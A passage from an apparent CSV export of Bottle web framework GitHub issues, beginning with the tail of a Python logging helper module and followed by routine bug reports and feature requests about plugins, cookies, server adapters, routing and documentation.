Usage: in __main__ only, place the following line at module scope
before calling init_logger:

sys.modules['__main__']['LOG_FILENAME'] = ""path/to/your/logfile""

In all modules (__main__ included) initialize the logger as follows:
debug, info, warning, error = logtest.init_logger()

Then you can freely call any of the above four procedures to create log
messages at the desired level.  The logfiles are rotated daily at midnight
with 7 days retention.

""""""

import sys
import os
import logging
import logging.handlers
import atexit
from traceback import format_exception
from multiprocessing import current_process
def on_exit():
    """""" Flush the logs when the program exits. """"""
    logging.shutdown()

atexit.register(on_exit)

DEFAULT = 0
USE_EXISTING = 1
CLEAR_EXISTING = 2

_logger = None  # global to hold the configured loggger.
def init_logger(action = DEFAULT, msg_prefix="""", logfile=None):
    """""" Call this once in your module to initialize our logger settings. """"""
    if logfile:
        filename=logfile
    else:
        try:
            filename = sys.modules['__main__'].LOG_FILENAME
        except AttributeError:
            ## typically needed for unit testing
            filename = ""/tmp/default.log""

    # Set up a specific logger with our desired output level
    #pid = os.getpid()
    #my_logger = logging.getLogger(str(pid))
    my_logger = logging.getLogger()  # Use the root logger
    my_logger.setLevel(logging.DEBUG)

    #if action == CLEAR_EXISTING:
    #    # Use in forked processes prevent duplicate messages.
    #    nhandlers = len(my_logger.handlers)
    #    for i in xrange(nhandlers):
    #        my_logger.handlers.pop(0)

    #elif action != USE_EXISTING:
    if action != USE_EXISTING:
        # Use in the __main__ module to create a handler.
        handler = logging.handlers.TimedRotatingFileHandler(
            filename=filename,
            when='midnight', interval=1, backupCount=7)

        formatter = logging.Formatter('%(asctime)s - pid:%(process)s - '
                                      'in:%(module)s.%(funcName)s() - '
                                      '%(levelname)s'
                                      '\n%(processName)s: %(message)s')
        handler.setFormatter(formatter)
        my_logger.addHandler(handler)

    ## Try always clearing all but last in list
    nhandlers = len(my_logger.handlers)
    for _ in range(nhandlers - 1):
        my_logger.handlers.pop(0)


    def logger_excepthook(etype, value, traceback):
        """""" See python docs for sys.excepthook to understand how this works. """"""
        my_logger.error("""".join(format_exception(etype, value, traceback)))

    sys.excepthook = logger_excepthook

    global _logger
    _logger = my_logger
    #return debug, info, warning, error
    return my_logger.debug, my_logger.info, my_logger.warning, my_logger.error

def setLevel(level):
    """""" So we can change it locally """"""
    ## Accept lowercase string names for levels
    levels = dict(
        debug=logging.DEBUG,
        info=logging.INFO,
        warning=logging.WARNING,
        error=logging.ERROR
        )
    try:
        _logger.setLevel(levels[level])
        return True
    except KeyError:
        return False

if __name__ == ""__main__"":
    # """""" For unit testing """"""
    LOG_FILENAME = ""/tmp/junk.log""
    debug, info, warning, error = init_logger()
    debug(""debug message"")
    info(""info message"")
    warning(""warning message"")
    ## deliberate uncaught error
    _x = 1/0

```

"
984,A plugin isn't executed on every request; how to fix? ,2017-07-14T13:14:38Z,2017-07-14T16:22:56Z,,,,"The first time a route is accessed, everything works fine, but subsequent requests to the same route are missing headers that should be set by a plugin (and are set correctly on the first request). Am I doing something wrong? Here is the basic setup:

```python
class SessionExtender(object):
    name = 'session_extender'
    api = 2

    def apply(self, callback, route):
        # do some internal things ....
        bottle.response.set_cookie('session', session_id, path='/', expires=some_date())

        print('setting header')
        bottle.response.set_header('Cache-Control', 'no-cache, no-store, must-revalidate')

        return callback


app = bottle.Bottle()
app.install(SessionExtender())
app.run(host='0.0.0.0', port=8080, debug=True, reloader=True)
```

The plugin extends the current session on any new activity, but since our intranet is running a proxy, I need to disable caching of all content, otherwise problems with getting outdated content are reliably reproducible. That's why I'm also setting the `Cache-Control` header.

So here is what I see if I request a route twice with curl, first after a fresh server restart, and the second one immediately afterwards:

```
% curl -I -b ""session=rzwDipsrxGYbKJHCnKxj"" http://localhost:8080/en/modal/preview/542
HTTP/1.0 200 OK
Date: Fri, 14 Jul 2017 13:06:59 GMT
Server: WSGIServer/0.2 CPython/3.6.1
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 1388
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=rzwDipsrxGYbKJHCnKxj; expires=Fri, 14 Jul 2017 21:06:59 GMT; Path=/


% curl -I -b ""session=rzwDipsrxGYbKJHCnKxj"" http://localhost:8080/en/modal/preview/542
HTTP/1.0 200 OK
Date: Fri, 14 Jul 2017 13:07:00 GMT
Server: WSGIServer/0.2 CPython/3.6.1
Content-Length: 1388
Content-Type: text/html; charset=UTF-8
```

Notice that both `Cache-Control` and `Set-Cookie` are missing the second time around.
And here is the access log from the server:

```
Bottle v0.12.13 server starting up (using WSGIRefServer())...
Listening on http://0.0.0.0:8080/
Hit Ctrl-C to quit.

setting header
/usr/lib/python3.6/re.py:301: DeprecationWarning: Flags not at the start of the expression ((?m)[urbURB]?(?:''( (truncated)
  p = sre_compile.compile(pattern, flags)
/usr/lib/python3.6/sre_parse.py:763: DeprecationWarning: Flags not at the start of the expression \{\{((?:((?m)[urbURB (truncated)
  p = _parse_sub(source, state, sub_verbose)
127.0.0.1 - - [14/Jul/2017 15:06:59] ""HEAD /en/modal/preview/542 HTTP/1.1"" 200 0
127.0.0.1 - - [14/Jul/2017 15:07:00] ""HEAD /en/modal/preview/542 HTTP/1.1"" 200 0
```

The second request doesn't print `setting header`, so I assume the plugin isn't executed the second time. Why does this happen and how can I make sure the `Cache-Control` header is set on every request?"
983,"""SameSite"" cookie feature (from issue #982)",2017-07-13T20:32:10Z,2017-07-14T08:02:42Z,,,,"As mentioned in #982, `set_cookie()` does not support  the ""SameSite"" cookie attribute.
This is because the `http.cookies` module doesn't support that either.
A reason for _this_ isn't really given. It's just that the module was based on RFC 2109 which ""SameSite"" is not a part of.
In the python repository changes have been made and a pull request opened (python/cpython#214) so that `http.cookies` could eventually support ""SameSite"" natively in 3.7.

However, since this is future stuff it doesn't really make a difference for bottle at the moment and i've come to the conclusion that it would be feature that's nice to have.

So i've added this feature to bottle, and updated the docs.

It doesn't to much, i just import the `_reserved` dict in which valid attributes for cookies are stored,
`set_cookie()` now supports the keyword `same_site` and ` raises a `CookieError` if the value for `same_site` isn't `strict` or `lax`.

This mimics petty much what the requested change for `http.cookies` in 3.7 would do. 

"
982,Add SameSite support for cookies,2017-07-13T09:15:23Z,2017-07-21T10:35:30Z,,,,"It would be great if we can set ""**SameSite**"" flag via set_cookie function.

e.g. 
response.set_cookie(cookie_key, cookie_id, same-site-cookies='Lax', ....)"
981,Update wget download instructions to use HTTPS for security,2017-06-30T00:04:27Z,2017-06-30T08:51:51Z,,,,This affords at least some assurance that what you download is indeed Bottle.
980,RFC optional host option to Bottle.route(),2017-06-29T19:42:03Z,,,,,"We have an app that responds to multiple domains using the same bottle app.  (It's a white-labeled thing for each customer.)  99% of our routes are universal to all customers, but occasionally we want to deviate on a per-domain basis.

For instance, `@app.get('/about')` might by implemented for us as:
```
@app.get('/about')
def about():
  domain = bottle.request.get_header('host')
  if domain=='www.mysite.com':
    return about_mysite_com()
  else:
    return about_default()
```

This gets cumbersome after a while.  It would be more convenient if we could do something like this:
```
@app.get('/about', host='www.mysite.com')
def about_mysite_com():
  [...]

@app.get('/about')
def about():
  [...]
```

Where the first route would only respond to the given domain.  (Or more likely, a pattern match to the domain.)

I know this would be trivial to implement on our own, but it seems universal enough of a problem that it would make a reasonable addition to the API.  (Which I'd be happy to write if there is interest.)  But I wanted to bring it up here to gauge interest, if this has been considered/rejected before, etc.

Thanks,
Derek

"
979,Update routing.rst,2017-06-19T10:03:26Z,2017-06-19T10:22:54Z,,,,Adds explanation for escape character \ in routing. #976
978,Enable cors on 401 responses,2017-06-15T19:52:31Z,2017-07-22T08:31:45Z,,,,"If I use 

```python
@hook('before_request')
def enable_cors():
    response.headers['Access-Control-Allow-Origin'] = '*'
```
All routes works with CORS, but when a view aborts v.g: `return abort(401, 'Access denied, incorrect user or password')` the headers are not added to the response.

```
Content-Length:747
Content-Type:text/html; charset=UTF-8
Date:Thu, 15 Jun 2017 19:50:49 GMT
Server:WSGIServer/0.2 CPython/3.5.3rc1
```"
977,is the django template engine supported?,2017-06-06T17:38:05Z,2017-06-09T17:57:42Z,,,,"Django templates have a standalone mode that can be used like below:

```python
from django.template import Context, Engine
engine = Engine()
template = engine.from_string(""Hello {{ name }}!"")
context = Context({'name': ""world""})
text = template.render(context)
print(text)
```

I was wondering if it can be used with bottle?

Thanks!"
976,How to use : (colon char) in route url?,2017-06-06T07:20:15Z,2017-06-19T10:23:03Z,Needs Documentation,,,"How to use : (colon char) in route url?

I have simple Bottle route, and URL should contain `:` (colon) sign. URL should be like `/REST/item:128` or `/REST/item:89753`

My route is

    @route('/REST/item:<id:int>')
    def icc(id):
        return { 'id': id }


Route is not working properly. id contain only last char from url id, not full id (`8` for `/REST/item:128`).

How to use `:` (colon char) in route properly?"
975,CherryPy server issue,2017-05-27T04:04:24Z,,,ImportError,"ImportError: cannot import name wsgiserver","Throws the following exception while running on `cherrypy` server.

```
C:\Users\username\AppData\Local\Continuum\Anaconda2\lib\pkgutil.py:186: ImportWarning: Not importing directory 'C:\Users\username\AppData\Local\Continuum\Anaconda2\lib\site-packages\paste': missing __init__.py
  file, filename, etc = imp.find_module(subname, path)
C:\Users\username\AppData\Local\Continuum\Anaconda2\lib\pkgutil.py:186: ImportWarning: Not importing directory 'c:\users\username\appdata\local\continuum\anaconda2\lib\site-packages\paste': missing __init__.py
  file, filename, etc = imp.find_module(subname, path)
Traceback (most recent call last):
  File ""server.py"", line 9, in <module>
    run(host='localhost', port='8080', server='cherrypy', debug=True)
  File ""C:\Users\username\AppData\Local\Continuum\Anaconda2\lib\site-packages\bottle.py"", line 3127, in run
    server.run(app)
  File ""C:\Users\username\AppData\Local\Continuum\Anaconda2\lib\site-packages\bottle.py"", line 2787, in run
    from cherrypy import wsgiserver
ImportError: cannot import name wsgiserver
```
As per the [link](https://github.com/cherrypy/cherrypy/issues/1585) in CherryPy github, the import should be changed to
```
try:
    from cheroot.wsgi import Server as WSGIServer
except ImportError:
    from cherrypy.wsgiserver import CherryPyWSGIServer as WSGIServer
```"
974,"AttributeError(""'FileUpload' object has no attribute 'read'"",),",2017-05-23T08:59:07Z,2017-06-09T18:01:07Z,,,,"When I'm trying to upload & read a file I having an exception.
I'm using the version 0.12.12"
973,conn > con in tutorial app,2017-05-15T15:44:57Z,2017-06-09T18:04:09Z,,,,Every sql connection is abbreviated to `conn` except for the very first `con`. Changed everything to `conn` for consistency.
972,Update tutorial_app.rst,2017-05-15T15:38:36Z,2017-06-09T18:05:22Z,,,,Fixed commenting/code block issue.
971,__enter__ and __exit__,2017-05-12T20:20:07Z,,,,,"Long ago (sometime earlier than Oct of 2016, which is as far back as I checked), __enter__() and __exit__() were added to the Bottle class so that one could use ""with app: ..."".  I especially enjoy this feature, and it's in the documentation (somewhere), so I don't see any reason why it shouldn't be merged into releases, but it hasn't been included in releases, so I can't grab pip versions or even git:release -- I always have to clone master.  Is there an explanation for the withholding of this feature or...?  Thanks!"
970,unit test mocking documentation,2017-05-08T22:35:33Z,2017-05-11T21:00:48Z,,,,re: discussion in #968
969,bundled sqlite plugin is python2 only in latest stable release (0.12.13),2017-05-06T14:32:36Z,,,,,"`bottly_sqlite.py` in both archives at https://github.com/bottlepy/bottle/releases/tag/0.12.13
is quite different (apparently from around 2014) than the current one at https://github.com/bottlepy/bottle-sqlite

The bundled version fails to run on Python3.

The version included a feature that did not ever made into the bottle-sqlite repo: `dbargs` parameter, which could be used to open databases in read-only mode."
968,possible addition to unit testing docs,2017-05-05T20:05:27Z,,,,,"under ""UNIT-TESTING BOTTLE APPLICATIONS"", the first method described does not allow you to unit test any route that accesses `bottle.request`.  which i'd argue is nearly 100% of bottle routes, so this method of unit testing has limited practical use.

this led us to write a lib [boddle](https://github.com/keredson/boddle), which allows us to use `with` blocks to mock out the `bottle.request` object.  example:
```
@bottle.get('/woot')
def woot():
  return bottle.request.params['name']

from boddle import boddle

def testWoot(self):
  with boddle(params={'name':'derek'}):
    self.assertEqual(woot(), 'derek')
```

might be a useful addition to the docs alongside `webtest`, etc if interested."
967,Update stpl.rst,2017-05-04T01:50:24Z,2017-05-04T13:20:13Z,,,,spelling change from foother to footer
966,How bottle can send list as parameter in get request?,2017-04-24T03:21:08Z,2017-04-24T08:41:59Z,,,,"If i have list as [0,1,3,4,1] how can i use get request to send it, and how can i get this list to handle like print list, or sort list, something like this. Thanks you."
965,a slightly tweaked version of @defnull's warning suggestion in #961,2017-04-20T21:59:48Z,2017-06-09T18:04:55Z,,,,closes #961
964,No access to system-wide app.config in mounted sub-app,2017-04-17T23:38:13Z,,,,,"Consider:

```python
from bottle import Bottle, request


child = Bottle()


@child.get('/')
def c_index():
    # http://127.0.0.1:8080/c/
    # this will fail, undefined 'secret_key'
    return request.app.config['secret_key']


def create_app():
    app = Bottle()

    @app.get('/')
    def index():
        # http://127.0.0.1:8080/
        # showing: 'oh my'
        return request.app.config['secret_key']

    app.config['secret_key'] = 'oh my'

    app.mount('/c/', child)

    return app


if __name__ == '__main__':
    app = create_app()
    app.run(debug=True)
```

http://127.0.0.1:8080/ showing 'oh my', and http://127.0.0.1:8080/c/ will be 500, replacing `request.app` with `bottle.default_app()` did not work, too.

Is it by design?  If so, what is the preferred way to read configuration in mounted applications without hacks? Thanks."
963,Ann: Nearly Pure Python Web App Demo using Bottle,2017-04-11T20:55:16Z,,,,,"I put together a minimalist web app skeleton using Bottle and Transcrypt that supports (mostly) pure python development on both the server and client sides. Nothing earthshaking but possibly useful. Feedback welcome.

https://github.com/Michael-F-Ellis/NearlyPurePythonWebAppDemo"
962,Not work multiple get requests for the same file types,2017-04-03T20:23:33Z,,,,,"__url request__ `http://localhost:8080/image.png` return 200 status code.
__url request__ `http://localhost:8080/img/image.png` return 404 status code.

in this source code:
```
@get(""<filepath:re:.*\.(png|ico)>"")
def img(filepath):
    return static_file(filepath, root=""./static/images"")

@get(""/img/<filepath:re:.*\.(jpg|png|ico|gif)>"")
def img_article(filepath):
    return static_file(filepath, root=""./db/images"")
```"
961,remove or replace the beaker session middleware example in recipes,2017-03-27T15:43:31Z,2017-06-09T18:04:55Z,,,,"It's borked, no longer maintained, etc.  At minimum, its [save function](https://github.com/bbangert/beaker/blob/8d08358873fcdb8e63cb215e5b19a150f3e7855d/beaker/session.py#L435) writes the entire session at once, clobbering other changes make in other HTTP requests to unrelated keys.

It existing in bottle's documentation is an implicit endorsement, and it's leading Bottle users astray.  It should not be used in production web applications that could ever make concurrent web requests.

Split off from here: https://github.com/bottlepy/bottle/issues/591#issuecomment-289492800"
960,Processing e-mail validation during account creation - using bottle framework,2017-03-24T10:32:09Z,2017-03-24T10:38:23Z,,,,"Team,
am using bottle framework for my web application. Respective to this work, we want to do email verification during registration process for creating a user account in our application. To proceed with this development, i didnt get any bottle related e-mail plugins and not able to close issue. Can you please let me know how to proceed with this issue."
959,make app.error can be used as a decorator or called directly,2017-03-18T04:37:05Z,2017-03-25T21:00:56Z,,,,"    """""" Register an output handler for a HTTP error code.
        Can be used as a decorator or called directly ::
            
            def error_handler_500(error):
                return 'error_handler_500'

            app.error(code=500, callback=error_handler_500)


            @app.error(404)
            def error_handler_404(error):
                return 'error_handler_404'
    """"""

I have modified the code, but cannot pass The Travis CI build 


    def error(self, code=500, callback=None):
        """""" Register an output handler for a HTTP error code.
            Can be used as a decorator or called directly ::
                
                def error_handler_500(error):
                    return 'error_handler_500'
                app.error(code=500, callback=error_handler_500)
                @app.error(404)
                def error_handler_404(error):
                    return 'error_handler_404'
        """"""
        
        def decorator(callback):
            if isinstance(callback, basestring): callback = load(callback)
            self.error_handler[int(code)] = callback
            return callback
        
        return decorator(callback) if callback else decorator"
958,make app.error can be used as a decorator or called directly.,2017-03-18T04:25:18Z,2017-03-25T16:34:09Z,,,,"        """""" Register an output handler for a HTTP error code.
            Can be used as a decorator or called directly ::
                
                def error_handler_500(error):
                    return 'error_handler_500'

                app.error(code=500, callback=error_handler_500)


                @app.error(404)
                def error_handler_404(error):
                    return 'error_handler_404'
        """""""
957,Template setting noscape,2017-03-17T23:25:55Z,,,,,"When I use the option template_settings={'noescape': True} in template function its work very well, but if I have e include function inside this template... the option noscape works only on primary call. 

include function throws scaped elements."
956,What about links for kickstart kits with Bottle?,2017-03-17T13:54:44Z,,,,,"Hello! Thank a lot for your awesome micro web-framework.

I start some very simple kickstart kit for Bottle and Vue.js: https://github.com/koddr/bottle-vue-kickstart But most likely I'm not alone... It would be great to have links to similar repositories on the official website or GitHub page!

With respect!"
955,No output from bottle on cygwin,2017-03-16T13:03:38Z,2017-03-25T21:10:17Z,,,,"When I run the basic ""Hello World"" app on bottle and cygwin, it serves to where it's supposed to, but it doesn't display any text."
954,add error handler by code,2017-03-15T14:17:27Z,2017-03-18T04:25:44Z,,,,add error handler by code
953,How to manually add parameter(s) to handler(s) at route point ?,2017-03-15T13:33:47Z,2017-03-15T13:47:04Z,,TypeError,"TypeError: static_handler() missing 1 required positional argument: 'root'","`
from bottle import static_file


def static_handler(path, root):
    return static_file(path, root=root)
`

`
app = Bottle()

app.get(path='/static/<path:path>', callback=static_handler, root='/webroot/static/')
`

`
TypeError: static_handler() missing 1 required positional argument: 'root'
`

"
952,MAX_BODY_SIZE support in tornado and meinheld,2017-03-14T09:58:26Z,2017-06-09T18:22:04Z,,,,Issue #951
951,Setting bottle.BaseRequest.MEMFILE_MAX does not affect tornado.httpserver.HTTPServer max_body_size ,2017-03-10T18:34:07Z,2017-03-14T10:02:42Z,,,,"I'm trying to send a multipart/form-data request to a bottle service that is using the tornado server.  I set bottle.BaseRequest.MEMFILE_MAX=1048576000 in my instance and bottle does not complain about the size of the request.  However, the size of the body exceeds tornado's default value of 104857600, so tornado returns a HTTP 413 error

```
Malformed HTTP message from 172.17.0.1: Content-Length too long
```

Is there any way to make bottle.BaseRequest.MEMFILE_MAX propagate through to the instance of tornado.httpserver.HTTPServer that is instantiated in bottle.TornadoServer?

```python
class TornadoServer(bottle.TornadoServer):
    """""" The super hyped asynchronous server by facebook. Untested. """"""
    def run(self, handler): # pragma: no cover
       import tornado.wsgi, tornado.httpserver, tornado.ioloop
       container = tornado.wsgi.WSGIContainer(handler)
       server = tornado.httpserver.HTTPServer(container) # <- Line to change below
       server.listen(port=self.port,address=self.host)
       tornado.ioloop.IOLoop.instance().start()
```

Passing the max_body_size when instantiating tornado.httpserver.HTTPServer resolves my issue:
```python
server = tornado.httpserver.HTTPServer(container, max_body_size=1048576000)
```

Is there any way to do this from bottle's interface?
"
950,"""AttributeError: 'PseudoInputFile' object has no attribute 'buffer'"" while attempting to export to CGI.",2017-03-06T20:54:16Z,2017-03-14T10:10:53Z,,AttributeError,AttributeError: 'PseudoInputFile' object has no attribute 'buffer'`,"`Traceback` (most recent call last):
  File ""C:\path-to-my-app\webapp.py"", line 18, in <module>
    app.run(server='cgi')
  File ""C:\...\Scripts\bottle.py"", line 755, in run
    run(self, **kwargs)
  File ""C:\...\Scripts\bottle.py"", line 3127, in run
    server.run(app)
  File ""C:\...\Scripts\bottle.py"", line 2750, in run
    CGIHandler().run(fixed_environ)
  File ""C:\...\lib\wsgiref\handlers.py"", line 519, in __init__
    self, sys.stdin.buffer, sys.stdout.buffer, sys.stderr,
AttributeError: 'PseudoInputFile' object has no attribute 'buffer'`"
949,DeprecationWarning: Flags not at the start of the expression,2017-03-03T20:58:05Z,,,,,"```
from bottle import route, run, template

@route('/hello/<name>')
def index(name):
    return template('<b>Hello {{name}}</b>!', name=name)

run(host='localhost', port=8080, debug=True, reloader=True)
```
When I run this code($ python3 hello.py) I get that error:

```
Bottle v0.13-dev server starting up (using WSGIRefServer())...
Listening on http://localhost:8080/
Hit Ctrl-C to quit.

/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/sre_parse.py:864: DeprecationWarning: Flags not at the start of the expression \{\{((?:(?mx)(       (truncated)
  p = _parse_sub(source, pattern, True, False)
```
Bottle is awesome. Thanks for your great work! "
948,To unify results in HTTPResponse?,2017-03-02T17:27:47Z,,,,,"https://github.com/bottlepy/bottle/blob/master/bottle.py#L1975

Checking the code of JSONPlugin I see that there are requests HTTPResponse (and HTTPError) but others only is the result and the rest of arguments as status_code comes from bottle.response.

Is this separation for some reason?

You could do something like this before calling the plugins


```python
if not isinstance(rv, HTTPResponse):
    rv, rv.body = response.copy(cls=HTTPResponse), rv
```

I am currently modifying that part of the code from mine to also allow to return other types like list, string, boolean, etc...
```python
from bottle import HTTPResponse, response, JSONPlugin


def apply(self, callback, route):
    dumps = self.json_dumps
    if not self.json_dumps:
        return callback

    def wrapper(*a, **ka):
        try:
            rv = callback(*a, **ka)
        except HTTPResponse as resp:
            rv = resp

        if not isinstance(rv, HTTPResponse):
            rv, rv.body = response.copy(cls=HTTPResponse), rv

        if rv.status_code == 200 and not rv.body:
            rv.status = 204
        elif not rv.content_type:
            rv.body = dumps(rv.body)
            rv.content_type = 'application/json'

        return rv
    return wrapper


JSONPlugin.apply = apply
```"
947,Leave explicit the maxima version supported the CherryPy (<= 9.0.0),2017-02-23T13:49:12Z,2017-03-25T18:13:33Z,,,,ref #934
946,"Redirect with WSGIproxy results in ""no space following status code""",2017-02-22T14:11:15Z,,Needs test,ValueError,"ValueError: no space following status code","I was setting up a simple proxy with bottle and wsgiproxy, the proxy is in the attached file. When the proxied server replies with a 302 redirect, I get the following error.

```
Critical error while processing request: /proxy/midpoint
Error:

ValueError('no space following status code',)

Traceback:

Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 960, in wsgi
    start_response(response._status_line, response.headerlist)
ValueError: no space following status code
```
Chasing this I discovered that indeed response._status_line is ""302"" with no trailing space in that line. I'm not sure if it is bottle or wsgiproxy that forgets to add the space there, but anyway it would be good if bottle tried to make sure the status line is formatted correctly

Wsgiproxy is the one you get by running ""pip install wsgiproxy"".

[authproxy.txt](https://github.com/bottlepy/bottle/files/793575/authproxy.txt)
"
945,Push travis-fix change to master,2017-02-20T15:44:08Z,2017-03-25T21:04:01Z,,,,hope it will pass travis
944,try fix travis ,2017-02-20T14:37:20Z,2017-02-20T14:41:26Z,,,,"@defnull 
remove `pip install -U coverage` after after python version check"
943,Update .travis.yml,2017-02-20T14:23:23Z,2017-03-25T21:06:27Z,,,,"@defnull fix travis problem with coverage and python 3.2
remove `pip install -U coverage`
after `pip install coverage==3.7.1` in case of python 3.2"
942,change cherrypy.wsgiserver by cheroot.wsgi since cherrypy v9.0.0,2017-02-20T13:37:58Z,2017-02-20T13:44:09Z,,,,"since cherrypy v9.0.0
https://github.com/cherrypy/cherrypy/blob/master/CHANGES.rst#v900
wsgi has been moved to cheroot"
941,Config hook not raised when config is loaded from a file,2017-02-15T07:35:57Z,2017-02-15T11:53:00Z,,,,"My aplication is loading its configuration from an `.ini` configuration file. I set an `@app.hook('config')` function and it is called when I change the configuration dictionary from within my application source code.

But, I noticed that when I change the content of the configuration file, the `hook` is not raised. Is it the expected Bottle behavior, I suppose so?

Any idea about the best solution to make the configuration get reloaded when the configuration file is updated; this will help to avoid Web server restarting 😉 "
940,Httptools intergration,2017-02-08T02:30:47Z,2017-02-15T10:38:13Z,,,,"Trying to make Bottle run faster as per req/sec. So far on my machine running apache bench its pretty fast. 
Faster then any other ServerAdapter.

running 'ab -n 100 -t 10 http://<SERVER-IP>:8081/' and returning simple JSON data.

When benched against Sanic, Bottle was actually on par with Sanic. **Note**: Someone should bench it and see if this statement is true or not, because it could just be my machine doing weird things...


"
939,Httptools a new Httpparser with Uvloop,2017-02-05T05:07:58Z,2017-02-23T22:18:11Z,,,,"this is not an Issue but rather a request for  Httptools support with Uvloop.

Uvloop is in 0.13.dev0, I ran a simple bench on it and its way faster then gevent.

will httptools with uvloop and asyncio be integrated into bottle python3+?"
938,"'RuntimeError('maximum recursion depth exceeded in cmp',)' On post request",2017-02-04T12:12:37Z,2017-02-15T11:25:00Z,,RuntimeError,"RuntimeError: maximum recursion depth exceeded in cmp","whenever I try to send a POST request to /login it returns the following page
`Critical error while processing request: /login

Error:

RuntimeError('maximum recursion depth exceeded in cmp',)
Traceback:

Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 954, in wsgi
    out = self._cast(self._handle(environ))
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 908, in _cast
    return self._cast(out)
   .
   .
   .
   .

  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 906, in _cast
    out.apply(response)
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 1702, in apply
    response._status_code = self._status_code
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 1664, in fset
    def fset(self, value): ls.var = value
RuntimeError: maximum recursion depth exceeded in cmp
`
as you see there were a lot of duplicate lines in that traceback, I tried: 
`@app.route('/login',method='POST')`
and then tried
`@app.post('/login')`
and when NONE worked 
i changed the recursion limit to 100000000
and that did not work
I am using bottle 0.12.13
, thanks in advance"
937,about simpletemplate include function,2017-02-04T09:37:49Z,2017-02-15T11:28:51Z,,,,"include function can't use the file which with path

like this

![img](https://magician333.github.io/Screenshot_20170204_173126.png)

I use code in html
`%include(""../test/base.html"")`

how to solved it?"
936,It's 2017....,2017-02-02T19:13:25Z,2017-06-09T18:23:37Z,,,,
935,Run(debug) argument is not described in doc,2017-02-02T11:15:37Z,,,,,"`Run(debug=True)` argument is not described in doc.

[module-contents](http://bottlepy.org/docs/dev/api.html#module-contents) lists arguments of `run` function, but `debug` arg is missed in doc."
934,Update CherryPy support for v 9.0.0 +,2017-02-02T01:44:19Z,,,,,"Current bottle (v0.12.13) is failing to import cherrypy.wsgiserver on line 2787 as it no longer exists.

[]http://docs.cherrypy.org/en/latest/history.html#v9-0-0

Work around by installing cherrypy version < 9.0.0
"
933,Support ujson,2017-02-01T09:47:52Z,2017-06-09T18:24:14Z,,,,"# ujson
Running 2s test @ http://172.17.0.1:8080/
  2 threads and 600 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency   141.65ms  322.13ms   1.95s    90.33%
    Req/Sec     6.73k     2.94k   11.84k    60.00%
  26819 requests in 2.02s, 4.42MB read
Requests/sec:  **13257.19**
Transfer/sec:      2.19MB

# json
Running 2s test @ http://172.17.0.1:8080/
  2 threads and 600 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency    55.01ms   95.84ms 888.11ms   92.93%
    Req/Sec     5.95k     3.52k   13.20k    75.00%
  23684 requests in 2.01s, 3.93MB read
Requests/sec:  **11762.51**
Transfer/sec:      1.95MB


code benchmark:
```python
from bottle import get, run

@get('/')
def bench():
    return {'hello': 'world'}

run(host='0.0.0.0', port=8080, server='gunicorn', worker_class='egg:meinheld#gunicorn_worker', quiet=True, debug=False)
```"
932,Add ServerAdapter (fix CherryPy ServerAdapter),2017-01-28T22:43:44Z,2017-03-25T18:13:33Z,,,,"Since CherryPy >= 9, the server part of CherryPy has been extracted and named Cheroot. Thus the old CherryPy ServerAdapter does not work for CherryPy >= 9: The import fails, and the SSL part should be different too. Cheroot can be installed (pip install cheroot) without CherryPy so that we can have a CherootServer adapter in addition to the CherryPyServer adapter for the older versions. I have used this class (just inheriting from bottle.ServerAdapter) and it worked for SSL and non-SSL.

(Edit:) To be clear: The proposed CherootServer adapter is foremost a fix of the CherryPyServer Adapter for the latest versions of CherryPy: When I pip install cherrypy, the cheroot server is installed along with cherrypy, and the imports are working as given in the proposed Adapter (as well as the SSL part). So one could also replace the body of the CherryPyServer adapter with the body of the proposed adapter, calling this adapter either still ""CherryPyServer"" or ""CherootServer"".
(Edit 2): Cp. [http://docs.cherrypy.org/en/latest/history.html](http://docs.cherrypy.org/en/latest/history.html)"
931,bottle should provide Plugin class as an abstract base,2017-01-24T23:05:43Z,,Request,,,"The plugin developer documentation has this weird line in it:

> Plugin is not a real class (you cannot import it from bottle) but an interface that plugins are expected to implement.

This seems to be the exact use case for providing [abstract base class](https://docs.python.org/2/library/abc.html) implementations. Is there any reason why bottle chooses to have this documentation crumb instead of providing a `Plugin` class which raises a `NotImplemented` error for all the methods defined in the required spec?"
930,DeprecationWarning: Flags not at the start of the expression,2017-01-22T15:34:33Z,2017-01-22T15:46:05Z,,,,"I get this in Python 3.6 with current pypi bottle version

```
Bottle v0.12.13 server starting up (using WSGIRefServer())...
Listening on http://localhost:8080/
Hit Ctrl-C to quit.

/Users/dima/.pyenv/versions/3.6.0/lib/python3.6/re.py:301: DeprecationWarning: Flags not at the start of the expression ((?m)[urbURB]?(?:''( (truncated)
  p = sre_compile.compile(pattern, flags)
/Users/dima/.pyenv/versions/3.6.0/lib/python3.6/sre_parse.py:763: DeprecationWarning: Flags not at the start of the expression \{\{((?:((?m)[urbURB (truncated)
  p = _parse_sub(source, state, sub_verbose)
```"
929,fix links commits #925,2017-01-19T11:54:39Z,2017-06-09T18:25:19Z,,,,Rel: https://github.com/bottlepy/bottle/issues/925
928,"bugfix: support multiple proxies ('HOSTNAME, HOSTNAME2' syntax)",2017-01-19T09:31:59Z,,,,,take the first one in urlparts
927,Add HTTP status code 451 according to RFC 7725,2017-01-18T10:08:18Z,2017-01-18T11:21:21Z,,,,"References:

- https://tools.ietf.org/html/rfc7725
- https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Status/451

This commit should make evil governments happy! 😈😈😈"
926,Adding the case where a closure not more contains a function in the recursion,2017-01-09T17:48:18Z,,,,,I discovered this was needed by adapting the sqlite plugin cf: https://github.com/bottlepy/bottle-sqlite/pull/16
925,broken links on bottlepy.org,2017-01-09T15:31:50Z,,,,,"I run [linkchecker](https://wummel.github.io/linkchecker/) against http://bottlepy.org/docs/dev/ and found just a few:
- http://bottlepy.org/docs/dev/tutorial.html: the bottle.py link referenced in #922
- http://bottlepy.org/docs/dev/changelog.html, many references to http://bottlepy.org/commit/8ccb2d that could be easily turned to `https://github.com/bottlepy/bottle/commit/8ccb2d`
